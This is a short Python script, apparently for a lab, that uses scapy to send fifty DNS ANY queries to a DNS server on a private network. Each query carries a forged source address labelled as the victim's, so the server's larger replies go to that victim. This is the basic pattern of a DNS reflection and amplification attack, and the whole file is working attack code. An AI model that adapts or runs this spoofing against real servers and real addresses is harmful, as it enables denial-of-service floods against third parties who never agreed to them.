import platform
import time
from scapy.all import *
import os

def get_interface():
    os_type = platform.system()

    if os_type == "Windows":
        return "Wi-Fi"
    elif os_type == "Darwin":  # macOS
        return "en0"
    else:
        raise OSError(f"Unsupported OS: {os_type}")

def spoof_batch():
    try:
        iface = get_interface()
        victim_ip = "192.168.1.200"      # spoofed source IP
        dns_server = "192.168.196.1"     # your machine's IP

        print(f"[*] Running on {platform.system()} | Using interface: {iface}")
        
        for i in range(50):
            pkt = Ether()/IP(src=victim_ip, dst=dns_server)/UDP(dport=53)/DNS(
                rd=1, qd=DNSQR(qname="test.local", qtype=255)
            )
            sendp(pkt, iface=iface, verbose=False)
            print(f"[+] Sent spoofed ANY query #{i+1}")
            time.sleep(0.05)

    except Exception as e:
        print(f"[!] Error: {e}")
        print("[!] Make sure the interface exists and you're running with appropriate permissions.")

spoof_batch()
